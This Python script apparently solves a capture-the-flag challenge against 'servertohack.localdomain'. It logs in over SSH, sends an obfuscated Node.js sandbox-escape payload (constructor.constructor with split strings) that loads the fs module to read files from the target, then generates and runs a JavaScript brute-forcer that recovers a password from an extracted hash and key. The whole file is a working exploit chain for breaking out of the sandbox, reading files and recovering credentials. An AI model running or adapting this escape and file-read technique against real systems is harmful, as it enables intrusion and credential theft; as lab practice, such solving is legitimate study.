#!/usr/bin/env python3

import subprocess


#
# Variables
#

debugOrNot = False
server = 'servertohack.localdomain'
username = 'hackonymousoflix'
identity = 'id_rsa'
port = 845


#
# Debug
#

def myDebug(param):
  if debugOrNot == True:
    print(param)


#
# Get nuclear code
#

result = subprocess.check_output("ssh -q -p" + str(port) + " -i " + identity + " " + username + "@" + server + " <<ENDSSH\nexec eval(String('t').concat('his')).constructor.constructor(String('console.l').concat('og(process.mainModule.constructor._load\\(\\'fs\\'\\).readFileSync\\(\\'/home/hackonymousoflix/.shell.sh\\'\\).toString\\(\\))'))()\nENDSSH", shell=True)
nuclear_code = result.decode().split('!')[1].split('\n')[1].split("'")[1]
myDebug(nuclear_code)


#
# Get hash from vm.js
#

result = subprocess.check_output("ssh -q -p" + str(port) + " -i " + identity + " " + username + "@" + server + " <<ENDSSH\nexec eval(String('t').concat('his')).constructor.constructor(String('console.l').concat('og(process.mainModule.constructor._load\\(\\'fs\\'\\).readFileSync\\(\\'/home/hackonymousoflix/vm.js\\'\\).toString\\(\\))'))()\nENDSSH", shell=True)
myDebug(result.decode())
splited_result = result.decode().splitlines()
for line in splited_result:
  if line.find('hash ==') > -1:
    hashpass = line.split("'")[1]
    break
myDebug(hashpass)


#
# Find password from hash
#

js = "result_hash = '" + hashpass + "';\n\
current_result = '';\n\
do {\n\
  i = 31;\n\
  do {\n\
    i++;\n\
    current_result_hash = require('crypto').createDecipher('aes-256-ctr', '" + nuclear_code + "').update(current_result.concat(String.fromCharCode(i)), 'utf8', 'hex');\n\
  } while (current_result_hash != result_hash.substring(0, current_result_hash.length) && i <= 127 )\n\
  if ( i <=127 ) {\n\
    current_result += String.fromCharCode(i);\n\
  }\n\
} while ( result_hash != current_result_hash )\n\
console.log(current_result);"
myDebug(js)
f = open('decrypt_vm_js_password.js', 'w')
f.write(js)
f.close()
result = subprocess.check_output("nodejs decrypt_vm_js_password.js", shell=True)
print(result.decode().splitlines()[0])
